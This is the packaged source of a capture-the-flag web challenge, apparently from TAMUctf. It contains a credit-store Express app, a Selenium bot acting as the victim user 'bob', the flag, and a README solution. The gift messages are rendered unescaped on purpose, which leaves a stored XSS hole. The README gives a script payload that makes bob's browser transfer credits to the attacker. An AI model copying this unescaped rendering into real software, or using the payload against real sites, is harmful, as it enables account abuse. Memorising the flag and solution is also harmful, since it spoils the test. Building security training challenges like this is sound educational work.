{
    "Dockerfile": "FROM ubuntu:latest\n\nRUN mkdir -p /data/db\nRUN apt update && apt install -y npm wget vim\nRUN wget -O - https://deb.nodesource.com/setup_13.x | bash\nRUN apt install -y nodejs\nRUN echo \"deb http://apt.postgresql.org/pub/repos/apt/ bionic-pgdg main\" | tee /etc/apt/sources.list.d/pgdg.list\nRUN wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc | apt-key add - \nRUN apt update\nRUN export DEBIAN_FRONTEND=noninteractive && apt install -y postgresql-11\nRUN ln -fs /usr/share/zoneinfo/America/Chicago /etc/localtime\nRUN dpkg-reconfigure --frontend noninteractive tzdata\n\nRUN mkdir auth-system && cd auth-system && mkdir models inventory views\nRUN npm init -f\nRUN npm install --save bcrypt body-parser cookie-parser express express-session express-rate-limit morgan pg sequelize pug\nRUN mv /node_modules /auth-system\nRUN mv /package.json /auth-system\nCOPY models /auth-system/models/\nCOPY inventory /auth-system/inventory/\nCOPY views /auth-system/views/\nCOPY entry.sh /auth-system/\nCOPY server.js /auth-system/\nCOPY pg_hba.conf /etc/postgresql/11/main/pg_hba.conf\n\nEXPOSE 80\n\nENTRYPOINT [\"/auth-system/entry.sh\"]\n",
    "entry.sh": "#!/bin/bash\n\ncd /auth-system\nservice postgresql start\npsql -U postgres -c 'CREATE DATABASE \"auth-system\"'\nnode server.js\n",
    "pg_hba.conf": "local   all             postgres                                trust\nlocal   all             all                                     peer\nhost    all             all             127.0.0.1/32            trust\nhost    all             all             ::1/128                 md5\nlocal   replication     all                                     peer\nhost    replication     all             127.0.0.1/32            md5\nhost    replication     all             ::1/128                 md5\n",
    "README.md": "# XSS unfiltered\nThe objective of this challenge is to make the user understand how cross site scripting works.\n\n# DISCLAIMER\n\nThis challenge was removed from TAMUctf mid-competition.\n\n## Challenge flavor\nTry testing out this new credit system that I just created! We already have our first user, bob!\n\n\t\thttp://<address>\n\nhint: Credit generation is rate limited. It is literally impossible to generate 2,000,000,000 credits within the CTF timeframe.\n\nhint2: Bob seems to have somehow gotten the 2,000,000,000 credits... He seems pretty active.\n\n## Setup\nBuild and run docker container for website\n\n        sudo docker build -t more_credits .\n\n\t\tsudo docker run more_credits\n\nThen build and run docker container for bob. Make sure to change the value on line 14 for bob_script.py to the actual address of the hosted webpage\n\n        sudo docker build -t bob .\n\n\t\tsudo docker run bob\n\n## Solution\nThe gifting system allows the user to send credits with a message tagline attached. The message system is vulnerable to XSS. Send the following payload to the user \"bob\" in a gift.\n\n        <script> var xhr = new XMLHttpRequest(); xhr.open(\"POST\",\"/gift\",true); xhr.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded; charset=UTF-8\"); xhr.send('username=sho&credits=2000000000&message=yourewelcome;)'); </script>\n",
    "server.js": "var Sequelize = require('sequelize');\nvar express = require('express');\nvar bodyParser = require('body-parser');\nvar cookieParser = require('cookie-parser');\nvar session = require('express-session');\nvar morgan = require('morgan');\nvar fs = require('fs');\nvar User = require('./models/user');\nvar rateLimit = require('express-rate-limit');\n\n// invoke an instance of express application.\nvar app = express();\n\n// set our application port\napp.set('port', 80);\n\n// set morgan to log info about our requests for development use.\napp.use(morgan('dev'));\n\n// initialize body-parser to parse incoming parameters requests to req.body\napp.use(bodyParser.urlencoded({ extended: true }));\n\n// initialize cookie-parser to allow us access the cookies stored in the browser. \napp.use(cookieParser());\n\n// initialize express-session to allow us track the logged-in user across sessions.\napp.use(session({\n    key: 'user_sid',\n    secret: 'bankbenkbinkbonk',\n    resave: false,\n    saveUninitialized: false,\n    cookie: {\n        expires: 600000\n    }\n}));\n\n\n// This middleware will check if user's cookie is still saved in browser and user is not set, then automatically log the user out.\n// This usually happens when you stop your express server after login, your cookie still remains saved in the browser.\napp.use((req, res, next) => {\n    if (req.cookies.user_sid && !req.session.user) {\n        res.clearCookie('user_sid');        \n    }\n    next();\n});\n\n\n// middleware function to check for logged-in users\nvar sessionChecker = (req, res, next) => {\n    if (req.session.user && req.cookies.user_sid) {\n        res.redirect('/');\n    } else {\n        next();\n    }    \n};\n\n//template engine\napp.set(\"view engine\", \"pug\");\napp.set(\"views\", __dirname + \"/views\");\n\n\n// route for Home-Page\napp.get('/', (req, res) => {\n    if (req.session.user && req.cookies.user_sid) {\n\t\tres.render(\"homepage\", {\n\t\t\tauthorized: true,\n\t\t\tusername: req.session.user.username\n\t\t});\n    } else {\n\t\tres.render(\"homepage\", {\n\t\t\tauthorized: false\n\t\t});\n    }\n});\n\n\n// route for user signup\napp.route('/signup')\n    .get(sessionChecker, (req, res) => {\n\t\tres.render(\"signup\");\n    })\n    .post((req, res) => {\n        User.create({\n            username: req.body.username,\n            password: req.body.password,\n\t\t\tcredits: 0,\n\t\t\titems: JSON.stringify({cat: 0, haiku: 0, helicopter: 0, flag: 0}),\n\t\t\tmessages: []\n        })\n        .then(user => {\n            req.session.user = user.dataValues;\n            res.redirect('/');\n        })\n        .catch(error => {\n            res.redirect('/signup');\n        });\n    });\n\n\n// route for user Login\napp.route('/login')\n    .get(sessionChecker, (req, res) => {\n\t\tres.render(\"login\");\n    })\n    .post((req, res) => {\n        var username = req.body.username,\n            password = req.body.password;\n\n        User.findOne({ where: { username: username } }).then(function (user) {\n            if (!user) {\n                res.redirect('/signup');\n            } else if (!user.validPassword(password)) {\n                res.redirect('/login');\n            } else {\n                req.session.user = user.dataValues;\n                res.redirect('/');\n            }\n        });\n    }\n);\n\nfunction renderGift(messages, err_msg, res) {\n\tvar html_message;\n\tif (messages.length == 0) {\n\t\thtml_message = \"No new messages\";\n\t} else {\n\t\tvar html_message = \"<ul style='list-style-type:none;'>\";\n\t\tfor (var message of messages){\n\t\t\thtml_message += \"<li>\" + message + \"</li>\"\n\t\t}\n\t\thtml_message += \"</ul>\";\n\t}\n\tres.render(\"gift\",{\n\t\terror_message: err_msg,\n\t\tnew_message: html_message\n\t});\n}\n\napp.route('/gift')\n    .get((req, res) => {\n\t\tif (req.session.user && req.cookies.user_sid) {\n\t\t\tUser.findOne({ where: { username: req.session.user.username } }).then(function (user) {\n\t\t\t\tif (!user) {\n\t\t\t\t\tres.redirect('/login');\n\t\t\t\t} else {\n\t\t\t\t\trenderGift(user.dataValues.messages, '', res);\n\t\t\t\t\tuser.update({messages: []});\n\t\t\t\t}\n\t\t\t});\n\t\t} else {\n\t\t\tres.redirect('/login');\n\t\t}\n    })\n    .post((req, res) => {\n\t\tif (req.session.user && req.cookies.user_sid) {\n\t\t\tvar from_user = req.session.user.username;\n\t\t\tvar to_user = req.body.username;\n\t\t\tvar send_credits = parseInt(req.body.credits);\n\t\t\tvar send_message = \"User \" + from_user + \" sent you \" + req.body.credits + \" credits: \" + req.body.message;\n\n\t\t\tif (send_credits <= 0) {\n\t\t\t\trenderGift(req.session.user.messages, 'You have to send at least 1 credit.', res);\n\t\t\t} else {\n\n\t\t\t\tUser.findOne({ where: { username: from_user } }).then(function (user) {\n\t\t\t\t\tif (!user) {\n\t\t\t\t\t\trenderGift(req.session.user.messages, 'Invalid FROM User', res);\n\t\t\t\t\t} else if(user.dataValues.credits < send_credits){\n\t\t\t\t\t\trenderGift(req.session.user.messages, 'You cannot send more credits than you have.', res);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tUser.findOne({ where: { username: to_user } }).then(function (user_to) {\n\t\t\t\t\t\t\tif (!user_to) {\n\t\t\t\t\t\t\t\trenderGift(req.session.user.messages, 'Invalid User', res);\n\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\tuser_to.increment('credits', { by: send_credits} );\n\t\t\t\t\t\t\t\tif (from_user != 'bob'){\n\t\t\t\t\t\t\t\t\tuser.decrement('credits', { by: send_credits} );\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tuser_to.update({'messages': Sequelize.fn('array_append', Sequelize.col('messages'),send_message)});\n\t\t\t\t\t\t\t\treq.session.user = user.dataValues;\n\t\t\t\t\t\t\t\tres.redirect('/gift');\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\t\t\t\t\t}\n\t\t\t\t});\n\t\t\t}\n\t\t} else {\n\t\t\tres.redirect('/login');\n\t\t}\n    }\n);\n\napp.post('/purchase', (req, res) => {\n    if (req.session.user && req.cookies.user_sid) {\n\t\tUser.findByPk(req.session.user.id).then(user => {\n\t\t\treturn user;\n\t\t}).then(user => {\n\t\t\tvar item = req.body.item;\n\t\t\tvar db_items = JSON.parse(user.dataValues.items);\n\t\t\tvar reply = item;\n\t\t\tvar num_creds = parseInt(user.dataValues.credits);\n\t\t\tif (db_items[item] == 1){\n\t\t\t\treply = reply + \" already purchased.\";\n\t\t\t} else {\n\t\t\t\tvar store = {cat: 10, haiku: 50, helicopter: 1000, flag: 2000000000};\n\t\t\t\tvar price = store[item];\n\t\t\t\tif (num_creds >= price){\n\t\t\t\t\tdb_items[item] = 1;\n\t\t\t\t\tuser.update({items: JSON.stringify(db_items)});\n\t\t\t\t\treply = reply + \" purchase successful\";\n\t\t\t\t\tif (user.dataValues.username != 'bob'){\n\t\t\t\t\t\tuser.decrement('credits', { by: price} );\n\t\t\t\t\t\tnum_creds = num_creds - price;\n\t\t\t\t\t}\n\t\t\t\t\treq.session.user = user.dataValues;\n\t\t\t\t\treq.session.user.credits = num_creds;\n\t\t\t\t} else{\n\t\t\t\t\treply = reply + \" purchase failed: Not enough credits.\";\n\t\t\t\t}\n\t\t\t}\n\t\t\tres.send({success: true, remaining_credits: num_creds, message: reply});\n\t\t});\n    } else {\n\t\tres.send({success: false, remaining_credits: num_creds, message: \"User session expired.\"});\n    }\n});\n\nfunction getItem(item) {\n\tvar filename = \"inventory/\" + item + \".txt\";\n\treturn fs.readFileSync(filename).toString();\n}\n\napp.get('/inventory', (req, res) => {\n    if (req.session.user && req.cookies.user_sid) {\n\t\tvar items = JSON.parse(req.session.user.items);\n\t\tvar inventory = {};\n\t\tfor (var item in items) {\n\t\t\tif (items[item] == 1) {\n\t\t\t\tinventory[item] = getItem(item);\n\t\t\t}\n\t\t}\n\t\tres.render(\"inventory\", inventory);\n    } else {\n        res.redirect('/login');\n    }\n});\n\nconst creditCreationLimiter = rateLimit({\n\twindowsMs: 5 * 60 * 1000,\n\tmax: 1000\n});\n\napp.post('/newcredit', creditCreationLimiter, (req, res) => {\n    if (req.session.user && req.cookies.user_sid) {\n\t\tUser.findByPk(req.session.user.id).then(user => {\n\t\t\treturn user.increment('credits');\n\t\t}).then(user => {\n\t\t\treq.session.user = user.dataValues;\n\t\t\tres.send({success: true, message: user.dataValues.credits});\n\t\t});\n    } else {\n\t\tres.send({success: false, message: \"User session expired.\"});\n    }\n});\n\n\n// route for user's store\napp.get('/store', (req, res) => {\n    if (req.session.user && req.cookies.user_sid) {\n\t\tUser.findByPk(req.session.user.id).then(user => {\n\t\t\treturn user;\n\t\t}).then(user => {\n\t\t\tres.render(\"store\", {\n\t\t\t\tnum_credits: user.dataValues.credits\n\t\t\t});\n\t\t});\n    } else {\n        res.redirect('/login');\n    }\n});\n\n\n// route for user logout\napp.get('/logout', (req, res) => {\n    if (req.session.user && req.cookies.user_sid) {\n        res.clearCookie('user_sid');\n        res.redirect('/');\n    } else {\n        res.redirect('/login');\n    }\n});\n\n\n// route for handling 404 requests(unavailable routes)\napp.use(function (req, res, next) {\n  res.status(404).send(\"Sorry can't find that!\")\n});\n\n\n// start the express server\napp.listen(app.get('port'), () => {\n\tconsole.log(`App started on port ${app.get('port')}`)\n});\n",
    "bob\\bob_script.py": "from selenium import webdriver\nfrom selenium.webdriver.firefox.options import Options\nimport time\n\nWEB_URL = 'http://172.17.0.2'\n\ndef main():\n    print('Setting up browser...', end='')\n    options = Options()\n    options.set_headless(headless=True)\n    browser = webdriver.Firefox(firefox_options=options)\n    print('done')\n    username = 'bob'\n    password = 'yG_hn6@@BJhw3H=5'\n    while True:\n        start = time.time()\n        try:\n            print('Logging in...', end='')\n            browser.get(WEB_URL + '/login')\n            browser.find_element_by_id('user').send_keys(username)\n            browser.find_element_by_id('pass').send_keys(password)\n            browser.find_element_by_id('login_submit').click()\n            print('done')\n        except Exception as e:\n            print(e)\n        print(start)\n        while True:\n            time.sleep(5)\n            print('Refreshing page...', end='')\n            try:\n                browser.get(WEB_URL + '/gift')\n            except Exception as e:\n                print(e)\n            print('done')\n            if('/login' in browser.current_url):\n                break\n    browser.quit()\n\nif __name__=='__main__':\n    main()\n",
    "bob\\Dockerfile": "FROM ubuntu:18.04\n\nRUN apt-get update\nRUN apt-get install wget vim firefox python3-pip -y\n\n# install geckodriver\nRUN wget https://github.com/mozilla/geckodriver/releases/download/v0.26.0/geckodriver-v0.26.0-linux64.tar.gz\nRUN tar xvfz geckodriver-v0.26.0-linux64.tar.gz\nRUN mv geckodriver /usr/local/bin\n\n# upgrade pip\nRUN pip3 install --upgrade pip\n\n# install selenium\nRUN pip3 install selenium\n\nCOPY bob_script.py .\n\nENTRYPOINT [\"python3\", \"/bob_script.py\"]\n",
    "inventory\\cat.txt": " _._     _,-'\"\"`-._\n(,-.`._,'(       |\\`-/|\n    `-.-' \\ )-`( , o o)\n          `-    \\`_`\"'-\n",
    "inventory\\flag.txt": "gigem{darn_eXpermiental_Space_Stations}\n",
    "inventory\\haiku.txt": "I like kittens, YEAH!\nThey are really fluffy, YEAH!\nOMG KITTENS.\n",
    "inventory\\helicopter.txt": "___________________________    __________________________\n`--------------------------`()'--------------------------'\n                            ||\n                         __ ||                                        __\n                         ] \"\"\"\"---...._                             .' /\n                   _,-\"\"\"==============`--.                       .'/)/\n                 ,' ) ,--. .-----.         `.___________________.' ///_\n               .'  / /___| |_____|  e c      TAMUctf     _______  ()  _>\n              /   / /____| |__|__|             ,----\"\"\"\"\"       `//  \\\n            .<`=='===========================.'                 (/`.  \\\n           (  `.----------------------------/                       `._\\\n            `-._\\_                ____...--'\n                  \"\"\"--ii--'\"\"\"77\"\n                 .____//______//___,\n                 `-----------------'\n\n",
    "models\\user.js": "var Sequelize = require('sequelize');\nvar bcrypt = require('bcrypt');\n\n// create a sequelize instance with our local postgres database information.\nvar sequelize = new Sequelize('postgres://postgres:postgres@localhost:5432/auth-system');\n\n// setup User model and its fields.\nvar User = sequelize.define('users', {\n    username: {\n        type: Sequelize.STRING,\n        unique: true,\n        allowNull: false\n    },\n    password: {\n        type: Sequelize.STRING,\n        allowNull: false\n    },\n    credits: {\n    \ttype: Sequelize.INTEGER,\n\t\tallowNull: false\n    },\n\titems: {\n\t\ttype: Sequelize.STRING,\n\t\tallowNull: false\n\t},\n\tmessages: {\n\t\ttype: Sequelize.ARRAY(Sequelize.TEXT),\n\t\tdefaultValue: null\n\t}\n});\n\nUser.beforeCreate((user,optionsObject) => {\n    const salt = bcrypt.genSaltSync();\n    user.password = bcrypt.hashSync(user.password, salt);\n});\n\nUser.prototype.validPassword = function(password) {\n    return bcrypt.compareSync(password, this.password);\n}\n\n\n// create all the defined tables in the specified database.\nsequelize.sync()\n    .then(() => {\n\t\tconsole.log('users table has been successfully created, if one doesn\\'t exist');\n\t\tUser.create({\n\t\t\tusername: 'bob',\n\t\t\tpassword: 'yG_hn6@@BJhw3H=5',\n\t\t\tcredits: 2000000000,\n\t\t\titems: JSON.stringify({cat: 0, haiku: 0, helicopter: 0, flag: 0}),\n\t\t\tmessages: []\n\t\t});\n\t})\n    .catch(error => console.log('This error occured', error));\n\n// export User model for use in other files.\nmodule.exports = User;\n\n\n",
    "views\\gift.pug": "html\n  head\n    title Gifting\n    link(rel='stylesheet', href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u', crossorigin='anonymous')\n  body.container\n    nav.navbar.navbar-default\n      .container-fluid\n        // Collect the nav links, forms, and other content for toggling\n        #bs-example-navbar-collapse-1.collapse.navbar-collapse\n          ul.nav.navbar-nav\n            li\n              a(href='/') Home\n            li\n              a(href='/store') Store\n            li\n              a(href='/inventory') Inventory\n            li\n              a(href='/gift') Gift\n          ul.nav.navbar-nav.navbar-right\n            li\n              a(href='/logout') Log Out\n        // /.navbar-collapse\n        // /.container-fluid\n    .page-header\n      h1 Credit Gifting System\n    .container.row\n      h2 Send others credits and view the credits that you have received.\n      form(method='POST' action='/gift')\n        div.form-group\n          label(for='username') To User:\n          input#name.form-control(type='text', placeholder='Username', name='username', required)\n        div.form-group\n          label(for='credits') Number of Credits to Send:\n          input#name.form-control(type='number', placeholder='Credit Amount', name='credits', required)\n        div.form-group\n          label(for='message') Message:\n          input#name.form-control(type='text', placeholder='Message Body', name='message')\n        button.btn.btn-primary(type='submit') Send Message\n        p(style='color:red') #{error_message}\n      h2 New Message:\n      pre\n        p !{new_message}\n",
    "views\\homepage.pug": "html\n    head\n        title Credits!\n        link(rel='stylesheet', href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u', crossorigin='anonymous')\n    body.container\n        nav.navbar.navbar-default\n            .container-fluid\n                // Collect the nav links, forms, and other content for toggling\n                #bs-example-navbar-collapse-1.collapse.navbar-collapse\n                    ul.nav.navbar-nav\n                        li\n                            a(href='/') Home\n                        if authorized\n                            li\n                                a(href='/store') Store\n                            li\n                                a(href='/inventory') Inventory\n                            li\n                                a(href='/gift') Gift\n                    ul.nav.navbar-nav.navbar-right\n                        unless authorized\n                            li\n                                a(href='/login') Log In\n                            li\n                                a(href='/signup') Sign Up\n                        if authorized\n                            li\n                                a(href='/logout') Log Out\n                // /.navbar-collapse\n                // /.container-fluid\n        .page-header\n            if username\n              h1 Howdy #{username}!\n            else\n              h1 Howdy!\n            h3 How are you doing today?\n",
    "views\\inventory.pug": "html\n  head\n    title Inventory\n    link(rel='stylesheet', href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u', crossorigin='anonymous')\n  body.container\n    nav.navbar.navbar-default\n      .container-fluid\n        // Collect the nav links, forms, and other content for toggling\n        #bs-example-navbar-collapse-1.collapse.navbar-collapse\n          ul.nav.navbar-nav\n            li\n              a(href='/') Home\n            li\n              a(href='/store') Store\n            li\n              a(href='/inventory') Inventory\n            li\n              a(href='/gift') Gift\n          ul.nav.navbar-nav.navbar-right\n            li\n              a(href='/logout') Log Out\n        // /.navbar-collapse\n        // /.container-fluid\n    .page-header\n      h1 Online Store\n    .container.row\n      h1 Hi, Welcome to your Inventory\n      if cat != null\n        h2 Cat:\n        pre\n          p #{cat}\n      else\n        p Cat: Unavailable\n        br\n      if haiku != null\n        h2 Haiku:\n        pre\n          p #{haiku}\n      else\n        p Haiku: Unavailable\n        br\n      if helicopter != null\n        h2 Helicopter:\n        pre\n          p #{helicopter}\n      else\n        p Helicopter: Unavailable\n        br\n      if flag != null\n        h2 Flag:\n        pre\n          p #{flag}\n      else\n        p Flag: Unavailable\n        br\n    script(src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js')\n    script.\n      function changeCreditDom(message) {\n      document.getElementById(\"numcredits\").innerHTML = message;\n      return;\n      }\n      $(\"#generate\").click(function() {\n      $.ajax({\n      url: '/newcredit',\n      method: 'POST',\n      data: {\n      increment: 1\n      }\n      }).done(function(data) {\n      if (data.success) {\n      changeCreditDom(data.message);\n      return;\n      }\n      }).fail(function() {\n      console.log('failed...');\n      return;\n      });\n      });\n      $(\"button.store\").click(function() {\n      var thisId = $(this).attr('id');\n      $.ajax({\n      url: '/purchase',\n      method: 'POST',\n      data: {\n      item: thisId\n      }\n      }).done(function(data) {\n      if (data.success) {\n      changeCreditDom(data.remaining_credits);\n      alert(data.message);\n      return;\n      }\n      }).fail(function() {\n      console.log('failed...');\n      return;\n      });\n      });\n\n",
    "views\\login.pug": "html\n    head\n        title Login Here\n        link(rel='stylesheet', href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u', crossorigin='anonymous')\n    body.container\n        nav.navbar.navbar-default\n            .container-fluid\n                // Collect the nav links, forms, and other content for toggling\n                #bs-example-navbar-collapse-1.collapse.navbar-collapse\n                    ul.nav.navbar-nav\n                        li\n                            a(href='/') Home\n                    ul.nav.navbar-nav.navbar-right\n                        li\n                            a(href='/login') Log In\n                        li\n                            a(href='/signup') Sign Up\n                // /.navbar-collapse\n                // /.container-fluid\n        .page-header\n            h1 Credit System Login\n        .container.row\n            .jumbotron.col-sm-4.pull-center\n                form(action='/login', method='post')\n                    div\n                        label Username:\n                        input(type='text', name='username', id='user')\n                    div\n                        label Password:\n                        input(type='password', name='password',id='pass')\n                    div\n                        input.btn.btn-primary(type='submit', value='Log In', id='login_submit')\n\n",
    "views\\signup.pug": "html\n    head\n        title Register\n        link(rel='stylesheet', href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u', crossorigin='anonymous')\n    body.container\n        nav.navbar.navbar-default\n            .container-fluid\n                // Collect the nav links, forms, and other content for toggling\n                #bs-example-navbar-collapse-1.collapse.navbar-collapse\n                    ul.nav.navbar-nav\n                        li\n                            a(href='/') Home\n                    ul.nav.navbar-nav.navbar-right\n                        li\n                            a(href='/login') Log In\n                        li\n                            a(href='/signup') Sign Up\n                // /.navbar-collapse\n                // /.container-fluid\n        .page-header\n            h1 Register Here!\n        .container.row\n            .jumbotron.col-sm-4.pull-center\n                form(action='/signup', method='post')\n                    div\n                        label Username:\n                        input(type='text', name='username')\n                    div\n                        label Password:\n                        input(type='password', name='password')\n                    div\n                        input.btn.btn-primary(type='submit', value='Sign Up')\n\n",
    "views\\store.pug": "html\n  head\n    title Store\n    link(rel='stylesheet', href='https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css', integrity='sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u', crossorigin='anonymous')\n  body.container\n    nav.navbar.navbar-default\n      .container-fluid\n        // Collect the nav links, forms, and other content for toggling\n        #bs-example-navbar-collapse-1.collapse.navbar-collapse\n          ul.nav.navbar-nav\n            li\n              a(href='/') Home\n            li\n              a(href='/store') Store\n            li\n              a(href='/inventory') Inventory\n            li\n              a(href='/gift') Gift\n          ul.nav.navbar-nav.navbar-right\n            li\n              a(href='/logout') Log Out\n        // /.navbar-collapse\n        // /.container-fluid\n    .page-header\n      h1 Credit System\n    .container.row\n      h1 Hi, Welcome to your Store\n      h2\n        | Credits: \n        span#numcredits #{num_credits} \n        button#generate Generate credit!\n    .container.row\n      | Cat: \n      button#cat.store 10 Credits\n      br\n      |  Haiku: \n      button#haiku.store 50 Credits\n      br\n      |  Helicopter: \n      button#helicopter.store 1000 Credits\n      br\n      |  Flag: \n      button#flag.store 2000000000 Credits\n      br\n    script(src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js')\n    script.\n      function changeCreditDom(message) {\n      document.getElementById(\"numcredits\").innerHTML = message;\n      return;\n      }\n      $(\"#generate\").click(function() {\n      $.ajax({\n      url: '/newcredit',\n      method: 'POST'\n      }).done(function(data) {\n      if (data.success) {\n      changeCreditDom(data.message);\n      return;\n      }\n      else {\n      alert(data.message);\n      }\n      }).fail(function() {\n      console.log('failed...');\n      return;\n      });\n      });\n      $(\"button.store\").click(function() {\n      var thisId = $(this).attr('id');\n      $.ajax({\n      url: '/purchase',\n      method: 'POST',\n      data: {\n      item: thisId\n      }\n      }).done(function(data) {\n      if (data.success) {\n      changeCreditDom(data.remaining_credits);\n      alert(data.message);\n      return;\n      }\n      else {\n      alert(data.message);\n      }\n      }).fail(function() {\n      console.log('failed...');\n      return;\n      });\n      });\n\n",
    "category": "Web"
}